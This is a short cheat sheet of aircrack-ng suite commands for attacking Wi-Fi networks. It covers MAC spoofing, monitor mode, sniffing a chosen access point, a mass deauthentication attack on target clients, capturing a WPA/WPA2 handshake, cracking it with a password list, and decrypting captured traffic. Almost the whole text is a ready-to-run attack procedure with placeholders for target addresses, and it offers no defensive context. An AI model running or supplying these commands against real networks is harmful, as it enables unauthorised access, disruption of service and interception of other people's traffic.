---------- Change MAC Address ----------

# view interfaces
iwconfig
 
# disable card
ifconfig wlan1 down
 
# get a new random MAC address
macchanger --random wlan1
 
# enable card
ifconfig wlan1 up



---------- Enable Monitor Mode ----------

# kill these processes BEFORE putting the card in monitor mode
airmon-ng check kill
 
# enable monitor mode
airmon-ng start wlan1



---------- Disable Monitor Mode ----------

# take card out of monitor mode
airmon-ng stop wlan0mon

# restart network manager
service network-manager start



---------- Find and Sniff Network ----------

# find the network that we want
airodump-ng wlan1mon

# sniff and save packets
airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/WPAcapture wlan1mon



---------- Deauth Attack ----------

# find the devices on a network
airodump-ng --bssid <AP MAC> --channel <#> wlan1mon

# send deauth packets
aireplay-ng --deauth 2000 -a <AP MAC> -c <TARGET MAC> wlan1mon



---------- Crack WPA / WPA2 Passphrase ----------

# capture handshake
airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/Captures/WPAsample wlan1mon

# loop through passwords
aircrack-ng Desktop/Captures/WPAsample-01.cap -w Desktop/Lists/passwords_top_1000.txt

# decrypt packets
airdecap-ng -e 'HOMEWIFI' -p bacon123 Desktop/Captures/WPAsample-01.cap










































